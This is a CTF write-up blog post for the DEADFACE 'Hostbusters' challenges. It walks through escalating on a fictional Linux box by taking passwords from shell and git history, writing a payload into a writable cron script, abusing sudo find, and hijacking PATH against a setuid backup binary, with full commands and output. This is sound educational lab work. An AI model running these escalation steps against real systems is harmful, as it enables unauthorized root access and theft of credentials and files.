---
layout: post
title:  "Hostbusters Challenges"
date:   2026-10-20 20:43:00 -0400
author: uzi
tags: [CTF]
permalink: /deadface-ctf-2026-hostbusters/
---
* TOC
{:toc}

## Foothold on Charon

**Category**: forensics priv esc linux

**Created By**: `@syyntax`

**Description**: DEADFACE runs an internal ops/staging box they call **charon** - it's where the crew coordinates their influence operation. We got you a foothold on it.

Open the web-shell by clicking the link below. You'll land at a shell as the `svc-deploy` service account. Get your bearings and find the flag that proves your foothold.

NOTE: Heads up: charon is disposable. Every web-shell session is a fresh copy of the box, so grab each flag as you find it.

Submit the flag as `deadface{flag-text}`.

[Access Hostbusters](https://hostbusters.dctf.io)

Access the webshell:
```shell
  ____ _   _    _    ____   ___  _   _
 / ___| | | |  / \  |  _ \ / _ \| \ | |
| |   | |_| | / _ \ | |_) | | | |  \| |
| |___|  _  |/ ___ \|  _ <| |_| | |\  |
 \____|_| |_/_/   \_\_| \_\\___/|_| \_|

DEADFACE ops/staging — Kingmaker workstream. Authorized members only.
You have a foothold as svc-deploy. Investigate. Escalate. Find the flags.
charon:~$ id
uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy),1001(svc-deploy)
charon:~$ ls -la
total 16
drwxr-x---    2 svc-depl svc-depl      4096 Aug 23 00:38 .
drwxr-xr-x    1 root     root          4096 Aug 23 00:38 ..
-rw-------    1 svc-depl svc-depl       196 Aug 23 00:38 .bash_history
-rw-r-----    1 svc-depl svc-depl        29 Aug 23 00:38 flag.txt
charon:~$ cat flag.txt
deadface{f00th0ld_0n_ch4r0n}
charon:~$ cat .bash_history
cd /opt/deploy
cat README.txt
systemctl status charon-collector.service || true
# ticket OPS-4471: rotate member pw after onboarding
echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
history -c
charon:~$ cat /opt/deploy/README.txt
CHARON — DEADFACE ops/staging box
Kingmaker workstream. Do NOT touch the analyst home dirs.
svc-deploy is the CI/deploy runner only. Rotate member creds via ticket.
```

Alright got the first flag and got new creds: `deephax:Sk4t3rB0y_S1nce_2011`

`deadface{f00th0ld_0n_ch4r0n}`

___

## Looking Back

**Category**: forensics priv esc linux

**Created By**: `@syyntax`

**Description**: Whichever member of DEADFACE who used the `svc-deploy` account last was sloppy. There are many DEADFACE members who use this machine.

Access one of their accounts and read the flag in their home directory. 

Become the user `deephax`:
```shell
charon:~$ su deephax
Password: 
charon:/home/svc-deploy$ id
uid=1002(deephax) gid=1002(deephax) groups=1002(deephax),1002(deephax)
charon:/home/svc-deploy$ cd /home/deephax
charon:~$ ls -la
total 20
drwxr-x---    3 deephax  deephax       4096 Aug 23 00:38 .
drwxr-xr-x    1 root     root          4096 Aug 23 00:38 ..
-rw-r-----    1 deephax  deephax         32 Aug 23 00:38 flag.txt
drwxr-xr-x    3 deephax  deephax       4096 Aug 23 00:38 kingmaker-scraper
-rw-r-----    1 deephax  deephax        141 Aug 23 00:38 notes.txt
charon:~$ cat flag.txt
deadface{h1st0ry_r3m3mb3rs_4ll}
charon:~$ cat notes.txt
reminder: I committed the scraper service pw by accident and "removed" it
in the next commit. must scrub git history properly at some point.
```

`deadface{h1st0ry_r3m3mb3rs_4ll}`

___

No challenge was given when I found this flag.

Deephax had a password scraper:
```shell
charon:~/kingmaker-scraper$ ls -al
total 24
drwxr-xr-x    3 deephax  deephax       4096 Aug 23 00:38 .
drwxr-x---    3 deephax  deephax       4096 Aug 23 00:38 ..
drwxr-xr-x    8 deephax  deephax       4096 Aug 23 00:38 .git
-rw-r--r--    1 deephax  deephax        144 Aug 23 00:38 config.py
-rw-r--r--    1 deephax  deephax        163 Aug 23 00:38 gh0st404_note.txt
-rw-r--r--    1 deephax  deephax        232 Aug 23 00:38 scraper.py
charon:~/kingmaker-scraper$ cat config.py
import os
# scraper service account (secret moved to env — see vault)
SERVICE_USER = "gh0st404"
SERVICE_PW = os.environ.get("SCRAPER_PW", "")
charon:~/kingmaker-scraper$ cat gh0st404_note.txt
gh0st404 // scrape ops
The nightly collector under /opt/scrape feeds sunstalker's analyst pipeline.
Targets this cycle: TGRI exec calendars, Cronin Group filings.
charon:~/kingmaker-scraper$ cat scraper.py
#!/usr/bin/env python3
"""kingmaker-scraper — collects target exec footprints for the op."""
from config import SERVICE_USER, SERVICE_PW

def main():
    print(f"[+] auth as {SERVICE_USER}")

if __name__ == "__main__":
    main()
charon:~/kingmaker-scraper$ cat /opt/scrape/collect.sh
#!/bin/sh
# nightly collector — maintained by gh0st404, RUN BY sunstalker via cron.
echo "[collect] $(date) scrape cycle ok" >> /tmp/collect.log
```

The git log contained credentials:
```shell
git show 5d51df72c709dcb296e4eed5eb24e2c7ea57b646
commit 5d51df72c709dcb296e4eed5eb24e2c7ea57b646 (HEAD -> master)
Author: deephax <deephax@charon>
Date:   Sun Aug 23 00:38:54 2026 +0000
commit 5d51df72c709dcb296e4eed5eb24e2c7ea57b646 (HEAD -> master)
Author: deephax <deephax@charon>
Date:   Sun Aug 23 00:38:54 2026 +0000

    move service pw out of source into env

diff --git a/config.py b/config.py
index d054ed3..f7e7af8 100644
--- a/config.py
+++ b/config.py
@@ -1,3 +1,4 @@
-# scraper service account
+import os
+# scraper service account (secret moved to env — see vault)
 SERVICE_USER = "gh0st404"
-SERVICE_PW = "Gh0stInTh3Sh3ll_404"
+SERVICE_PW = os.environ.get("SCRAPER_PW", "")
```

`gh0st404:Gh0stInTh3Sh3ll_404`

I became `gh0st404` and got another flag:
```shell
charon:~/kingmaker-scraper$ su gh0st404
Password: 
charon:~$ ls -la
total 16
drwxr-x---    2 gh0st404 gh0st404      4096 Aug 23 00:38 .
drwxr-xr-x    1 root     root          4096 Aug 23 00:38 ..
-rw-r-----    1 gh0st404 gh0st404       163 Aug 23 00:38 README.txt
-rw-r-----    1 gh0st404 gh0st404        28 Aug 23 00:38 flag.txt
charon:~$ cat flag.txt
deadface{g1t_n3v3r_f0rg3ts}
charon:~$ cat README.txt
gh0st404 // scrape ops
The nightly collector under /opt/scrape feeds sunstalker's analyst pipeline.
Targets this cycle: TGRI exec calendars, Cronin Group filings.
```

`deadface{g1t_n3v3r_f0rg3ts}`

This flag was extra? There was no where to submit it. 

___

## Dangerous Capability

**Category**: forensics priv esc linux

**Created By**: `@syyntax`

**Description**: `lilith` did OSINT correlation for the op and left some "crypto tooling" lying around charon. One of those tools was granted a Linux capability it should never have had.

Use it to become the next user and read their flag.

```shell
charon:/$ cat /etc/cron.d/charon-collect
# charon collector: runs as sunstalker; script is maintained by gh0st404
* * * * * sunstalker /opt/scrape/collect.sh
  charon:/$ cat /opt/scrape/collect.sh
#!/bin/sh
# nightly collector — maintained by gh0st404, RUN BY sunstalker via cron.
echo "[collect] $(date) scrape cycle ok" >> /tmp/collect.log
charon:/$ cat /tmp/collect.log
[collect] Sat Oct 17 20:24:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:25:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:26:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:27:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:28:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:29:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:30:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:31:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:32:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:33:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:34:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:35:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:36:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:37:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:38:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:39:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:40:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:41:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:42:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:43:00 UTC 2026 scrape cycle ok
[collect] Sat Oct 17 20:44:00 UTC 2026 scrape cycle ok
```

I can write to `collect.sh`:
```shell
charon:/home/svc-deploy$ ls -lah /opt/scrape
total 12K    
drwxr-xr-x    2 gh0st404 gh0st404    4.0K Aug 23 00:38 .
drwxr-xr-x    1 root     root        4.0K Aug 23 00:38 ..
-rwxr-xr-x    1 gh0st404 gh0st404     147 Aug 23 00:38 collect.sh
```
It gets ran as `sunstalker`.

I change it so I will get a shell as `sunstalker` in `/tmp` the next time it runs:
```shell
charon:/home/svc-deploy$ cat > /opt/scrape/collect.sh <<'EOF'
#!/bin/sh
cp /bin/sh /tmp/sh
chmod 4755 /tmp/sh
EOF
charon:/home/svc-deploy$ chmod +x /opt/scrape/collect.sh
```

I actually dont get a shell as `sunstalker` when I do this:
```shell
charon:/home/svc-deploy$ /tmp/sh
/home/svc-deploy $ id
uid=1003(gh0st404) gid=1003(gh0st404) groups=1003(gh0st404),1003(gh0st404)
```
When busybox is invoked setuid and the applet `sh` isnt in its SUID allow list, it deliberately drops the effective UID back to the real UID. 

Instead I just put this into the script:
```shell
cat /home/sunstalker/flag.txt > /tmp/sun_flag 2>/dev/null
```

This did return the flag:
```shell
/home/svc-deploy $ cat /tmp/sun_flag
deadface{cr0n_r4n_my_p4yl04d}
```

I ran some more recon commands under this user and managed to find this:
```shell
id
uid=1004(sunstalker) gid=1004(sunstalker) groups=1004(sunstalker),1004(sunstalker)
sudo -l
User sunstalker may run the following commands on charon:
    (lilith) NOPASSWD: /usr/bin/find
```

I went to [https://gtfobins.org/](https://gtfobins.org/) to see how `find` can be abused.

I dropped this into `collect.sh`:
```shell
cat > /opt/scrape/collect.sh <<'EOF'
#!/bin/sh
sudo -n -u lilith /usr/bin/find /home/lilith/flag.txt -exec cat {} \; > /tmp/loot 2>&1
chmod 644 /tmp/loot
EOF
```

```shell
/home/svc-deploy $ cat /tmp/loot
deadface{sud0_b3c4m3_l1l1th}
```

`deadface{sud0_b3c4m3_l1l1th}`

I found the file `osint.txt` in liliths home directory:
```shell
lilith // OSINT correlation
Marcus Leighton (TGRI, R&D director) dossier cross-checks clean.
spookyboi has the decryption tooling — hand the cache up the chain.
```

The box has these users:
```shell
charon:~$ ls /home
deephax     gh0st404    lilith      mort1cia    spookyboi   sunstalker  svc-deploy
```
I start as `svc-deploy`. I have compromised `deephax`, `gh0st404`, `sunstalker`, and `lilith` (who can run `find` as sudo!)

The binary uses tar:
```shell
charon:/home/svc-deploy$ strings /usr/local/bin/charon-backup | grep -E 'tar' | head -n 1
tar czf /var/backups/charon-ops.tgz -C /opt ops 2>/dev/null
```

This should be vulnerable to PATH hijacking!

```shell
charon:/home/svc-deploy$ mkdir -p /tmp/x
charon:/home/svc-deploy$ cat > /tmp/x/tar <<'EOF'
#!/bin/sh
id > /tmp/pathid
for u in spookyboi mort1cia; do cat /home/$u/flag.txt > /tmp/$u.flag 2>/dev/null; done
cat /root/flag.txt > /tmp/root.flag 2>/dev/null
chmod 644 /tmp/*.flag /tmp/pathid 2>/dev/null
EOF
charon:/home/svc-deploy$ chmod +x /tmp/x/tar
charon:/home/svc-deploy$ PATH=/tmp/x:$PATH /usr/local/bin/charon-backup
[charon-backup] archiving /opt/ops ...
[charon-backup] done.
charon:/home/svc-deploy$ ls /tmp
collect.log     lilith          lilith_sudo     mort1cia.flag   next            pathid          root.flag       spooky          spookyboi.flag  x
charon:/home/svc-deploy$ cat /tmp/pathid
uid=0(root) gid=0(root) groups=1003(gh0st404),1003(gh0st404)
charon:/home/svc-deploy$ cat /tmp/spookyboi.flag /tmp/mort1cia.flag
deadface{c4p_s3tu1d_pwn3d}
deadface{h4sh_cr4ck3d_w1d3_0p3n}
charon:/home/svc-deploy$ cat /tmp/root.flag
deadface{p4th_t0_th3_cr0wn}
```

First I created the directory `/tmp/x`. Then create a custom shell script inside called `tar` and have it read the flags from the two uncompromised user accounts and the root flag.

Then export the path (hijack it), then run `charon-backup` binary again.

There was 8 flags here. I only needed 3. Maybe they will be released later. 

Later I found out the challenge author had left a misconfiguration on the server. All challenges were taken down and re-released with new flags :(

`deadface{f00th0ld_0n_ch4r0n}`
`deadface{h1st0ry_r3m3mb3rs_4ll}`
`deadface{g1t_n3v3r_f0rg3ts}`
`deadface{cr0n_r4n_my_p4yl04d}`
`deadface{sud0_b3c4m3_l1l1th}`
`deadface{c4p_s3tu1d_pwn3d}`
`deadface{h4sh_cr4ck3d_w1d3_0p3n}`
`deadface{p4th_t0_th3_cr0wn}`

___

## Final Solution

For the new challenges:
```shell
charon:/home/svc-deploy$ mkdir -p /tmp/x
charon:/home/svc-deploy$ cat > /tmp/x/tar <<'EOF'
#!/bin/sh
id > /tmp/pathid
# every home dir
for u in deephax gh0st404 lilith mort1cia spookyboi sunstalker svc-deploy; do
  cp /home/$u/flag.txt /tmp/$u.flag 2>/dev/null
  cp /home/$u/flag    /tmp/$u.flag2 2>/dev/null
done
# root + common flag spots
for f in /root/flag.txt /root/flag /flag.txt /flag /opt/flag.txt /srv/flag.txt; do
  [ -f "$f" ] && cp "$f" "/tmp/root$(echo "$f" | tr / _)" 2>/dev/null
done
chmod 644 /tmp/*.flag* /tmp/root* /tmp/pathid 2>/dev/null
EOF
charon:/home/svc-deploy$ chmod +x /tmp/x/tar
charon:/home/svc-deploy$ PATH=/tmp/x:$PATH /usr/local/bin/charon-backup
[charon-backup] archiving /opt/ops ...
[charon-backup] done.
charon:/home/svc-deploy$ ls -la /tmp/*.flag* /tmp/root* 2>/dev/null
-rw-r--r--    1 root     root            34 Oct 18 20:00 /tmp/deephax.flag
-rw-r--r--    1 root     root            33 Oct 18 20:00 /tmp/gh0st404.flag
-rw-r--r--    1 root     root            29 Oct 18 20:00 /tmp/lilith.flag
-rw-r--r--    1 root     root            30 Oct 18 20:00 /tmp/mort1cia.flag
-rw-r--r--    1 root     root            34 Oct 18 20:00 /tmp/root_root_flag.txt
-rw-r--r--    1 root     root            31 Oct 18 20:00 /tmp/spookyboi.flag
-rw-r--r--    1 root     root            34 Oct 18 20:00 /tmp/sunstalker.flag
-rw-r--r--    1 root     root            33 Oct 18 20:00 /tmp/svc-deploy.flag
charon:/home/svc-deploy$ cat /tmp/*.flag* /tmp/root* 2>/dev/null
deadface{sh3ll_h1st0ry_t3lls_4ll}
deadface{g1t_l0g_sp1lls_s3cr3ts}
deadface{sud0_f1nd_4_w4y_1n}
deadface{0s1nt_n3v3r_f0rg3ts}
deadface{c4p_s3tu1d_cuts_d33p}
deadface{cr0n_c4rr13d_my_p4yl04d}
deadface{f00th0ld_p4st_th3_v31l}
deadface{p4th_h1j4ck3d_t0_thr0n3}
charon:/home/svc-deploy$ 
```
